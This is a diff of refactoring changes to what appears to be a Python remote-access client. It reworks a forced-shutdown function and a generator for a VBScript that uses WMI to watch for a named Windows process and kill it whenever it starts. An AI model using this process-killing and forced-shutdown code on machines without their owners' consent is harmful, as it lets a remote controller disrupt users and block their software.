@@ -239,7 +239,7 @@ def lock():
 
 
 def shutdown(shutdowntype):
-    command = "shutdown {0} -f -t 30".format(shutdowntype)
+    command = f"shutdown {shutdowntype} -f -t 30"
     subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     objSocket.close()  # close connection and exit
     sys.exit(0)
@@ -306,18 +306,18 @@ def python_interpreter():
 def vbs_block_process(process, popup, message, title, timeout, type):
     # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
 
-    strVBSCode = "On Error Resume Next" + "\n" + \
-                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
-                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
+    strVBSCode = "On Error Resume Next\n" + \
+                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
+                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                  "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
-                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
-                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
-                 "If LCase(objLatestProcess.TargetInstance.Name) = \"" + process + "\" Then" + "\n" + \
-                 "objLatestProcess.TargetInstance.Terminate" + "\n"
+                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
+                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
+                 f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
+                 "objLatestProcess.TargetInstance.Terminate\n"
     if popup == "True":  # if showing a message
-        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"
+        strVBSCode += f'objWshShl.Popup "{message}",{timeout}, "{title}",{type}\n'
 
-    strVBSCode += "End If" + "\n" + "Loop"
+    strVBSCode += "End If\nLoop"
 
     with open(TMP + "/d.vbs", "w") as objVBSFile:
         objVBSFile.write(strVBSCode)
